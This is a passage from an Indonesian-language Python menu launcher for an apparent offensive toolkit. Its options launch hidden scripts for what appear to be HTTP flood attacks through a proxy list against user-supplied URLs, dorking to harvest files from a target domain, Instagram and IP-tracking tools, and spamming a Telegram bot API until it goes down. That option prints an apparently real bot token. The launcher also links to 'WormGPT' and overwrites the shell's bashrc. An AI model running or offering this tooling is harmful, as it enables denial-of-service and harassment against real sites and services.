                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDisarankan tidak menggunakan android")
                    url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    if url.endswith("id"):
                        time.sleep(1)
                        print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        time.sleep(0.5)
                        sys.exit()
                    else:
                        # os.system(f"node .j {url} {time} {req} {th} proxy.txt")
                        os.system(f"node .j {url} 60 10 30 proxy.txt")
                        wait = input("\n \033[1;33mPress Enter to continue")
                        os.system("cls" if os.name == "nt" else "clear")
                        logo()
                #elif pilihan.endswith("6"):
                    #time.sleep(1)
                    #url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    #if url.endswith("id"):
                        #time.sleep(1)
                        #print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        #time.sleep(0.5)
                        #sys.exit()
                    #else:
                        #os.system(f"go run k.go -site {url} -data get")
                        #wait = input(" \033[1;33mPress Enter to continue")
                        #os.system("cls" if os.name == "nt" else "clear")
                        #logo()
                #elif pilihan.endswith("7"):
                    #time.sleep(1)
                    #url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mTarget \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
                    #if url.endswith("id"):
                        #time.sleep(1)
                        #print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
                        #time.sleep(0.5)
                        #sys.exit()
                    #else:
                        #os.system(f"go run k.go -site {url} -data post")
                        #wait = input(" \033[1;33mPress Enter to continue")
                        #os.system("cls" if os.name == "nt" else "clear")
                        #logo()
                
                    
                else:
                    time.sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "2" or message == "02":
                time.sleep(1)
                print("\033[1;31mTutorial :")
                print("1. Tekan Launch, kalo gak bisa daftar dulu.")
                print("2. Tekan garis 3 pojok kiri atas.")
                print("3. Tekan terminal lalu pilih new terminal.")
                print("4. Jika ingin menjalankan script yg sama, silakan copy perintah dibawah ini!")
                print("\n\033[0;37mgit clone https://github.com/ShadowXploit/dark-x\ncd dark-x\nbash module.sh\npython bot.py")
                print("\n\033[1;31mJika tidak, silakan copy command dari sumber github masing².")
                os.system("xdg-open https://onecompiler.com/studio/jupyter-notebook")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "3" or message == "03":
                time.sleep(1)
                print("\033[1;31mTips :")
                print("1. Tekan enter lalu tunggu 120 detik.")
                print("2. Jika ingin menjalankan script yg sama, silakan copy perintah dibawah ini!")
                print("\n\033[0;37mgit clone https://github.com/ShadowXploit/dark-x\ncd dark-x\nbash module.sh\npython bot.py")
                print("\n\033[1;31mJika tidak, silakan copy command dari sumber github masing².")
                os.system("xdg-open https://shell.segfault.net/#/dashboard")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "4" or message == "04":
                time.sleep(1)
                target = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mDomain Target \033[1;31m(ex. kpu.go.id) \033[1;36m: \033[0;37m")
                filetype = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mFiletype \033[1;31m(ex. pdf,xlsx,docx,csv/all) \033[1;36m: \033[0;37m")
                page = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah Halaman \033[1;31m(ex. 3) \033[1;36m: \033[0;37m")
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                os.system(f"bash .h -t {target} -e {filetype} -p {page}")
                print("")
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "5" or message == "05":
                time.sleep(1)
                print("")
                url = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL Target \033[1;31m(ex. https://kpu.go.id) \033[1;36m: \033[0;37m")
                limit = input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mJumlah Pencarian \033[1;31m(ex. 3) \033[1;36m: \033[0;37m")
                time.sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                os.system(f"python .e -d {url} -b {limit}")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "6" or message == "06":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                ig()
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "7" or message == "07":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                IP_Track()
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "8" or message == "08":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                os.system("python3 gpt.py")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "9" or message == "09":
                time.sleep(1)
                os.system("xdg-open https://flowgpt.com/p/wormgpt-v30")
                time.sleep(2)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "10":
                time.sleep(1)
                print("\n \033[1;31m[\033[1;37m1\033[1;31m] \033[1;36mUbah Tampilan")
                print(" \033[1;31m[\033[1;37m2\033[1;31m] \033[1;36mBackup Tampilan")
                print(" \033[1;31m[\033[1;37m \033[1;31m] \033[1;36mBack To Menu")
                pilihan = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mChoose \033[1;31m: \033[1;37m")
                if pilihan.endswith("1"):
                    time.sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    os.system("bash .d")
                    wait = input("\033[1;33mPress Enter to continue")
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                elif pilihan.endswith("2"):
                    time.sleep(1)
                    os.system("cp .data/.sh1 $HOME/../usr/etc/bash.bashrc")
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mSelesai")
                    print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mKetik \033[1;31mlogin \033[1;34muntuk mencoba!")
                    time.sleep(3)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
                else:
                    #print("\033[1;31mInvalid options...!!!")
                    time.sleep(1)
                    os.system("cls" if os.name == "nt" else "clear")
                    logo()
            elif message == "11":
                time.sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                os.system("python2 .b")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "12":
                print(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;36mPlease wait...")
                os.system("python3 .s")
                wait = input("\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "13":
                def replace_text_in_first_line(input_file, output_file, new_text):
                    with open(input_file, 'r') as file:
                        lines = file.readlines()
                    lines[0] = new_text + '\n'
                    with open(output_file, 'w') as file:
                        file.writelines(lines)
                input_file = 'urls.txt'
                output_file = 'urls.txt'
                time.sleep(1)
                print("\033[1;34mNote \033[1;31m: \n\033[0;37mJika anda menerima virus berbentuk undangan apk atau sejenisnya,\nsilakan bongkar & lihat sourcenya & copy API telegram si penipu\ndari apk nya untuk di spam hingga down. Dan selamat, anda telah\nmenyelamatkan banyak orang:)")
                time.sleep(0.3)
                print("\n\033[1;34mContoh API telegram \033[1;31m: \033[0;37mhttps://api.telegram.org/bot6857276354:AAH98ElI1j81M3c3KlcxoqIMzTX6H_EAIFA/sendMessage?parse_mode=markdown&chat_id=6310342995&text=MAU NIPU DEK\n\033[1;31m(MAU NIPU DEK) di ganti isi pesan spam")
                time.sleep(0.3)
                new_text = input("\n\033[1;34mMasukkan API target \033[1;31m: \033[0;37m")
                replace_text_in_first_line(input_file, output_file, new_text)
                os.system("node .a")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "14":
                os.system("cls" if os.name == "nt" else "clear")
                time.sleep(1)
                os.system("python3 .c")
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "15":
                time.sleep(1)
                os.system("xdg-open https://jnckmedia.com/nulis/")
                time.sleep(2)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "16":
                time.sleep(1)
                os.system("python3 .i") #0000000000000
                wait = input("\n \033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "17":
                time.sleep(1)
                os.system("python3 .n") #0000000000000
                wait = input("\n\033[1;33mPress Enter to continue")
                os.system("cls" if os.name == "nt" else "clear")
                logo()
            elif message == "18":
                os.system("bash update.sh")
            elif message == "LOGIN" or message == "login" or message == "Login":
                os.system("login")
            else:
                print("\033[1;31mInvalid options...!!!")
                time.sleep(1)
                os.system("cls" if os.name == "nt" else "clear")
                logo()
    except KeyboardInterrupt:
        print(" \033[1;31m[\033[1;37m!\033[1;31m] \033[1;33mProgram dihentikan")
        time.sleep(1)
        print()
        break
        
